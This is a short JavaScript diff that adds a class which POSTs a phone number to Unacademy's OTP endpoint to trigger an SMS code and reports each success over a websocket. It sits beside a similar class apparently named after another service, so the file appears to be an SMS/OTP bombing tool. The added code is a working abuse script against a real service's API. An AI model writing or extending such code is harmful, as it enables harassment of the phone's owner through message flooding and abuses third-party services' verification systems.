@@ -170,3 +170,18 @@ class netmeds{
         })
     }
 }
+
+class unacademy{
+    constructor(number,ws){
+        fetch("https://unacademy.com/api/v3/user/user_check/?enable-email=true",{
+            method:"POST",
+            headers:{
+                "Content-Type":"application/json"
+            },
+            body:JSON.stringify({"phone":number,"country_code":"IN","otp_type":1,"email":"","send_otp":true,"is_un_teach_user":false})
+        }).then(res=>res.json()).then((data)=>{
+            if(data.message === "OTP has been sent to your phone number")
+                ws.send("+1")
+        })
+    }
+}
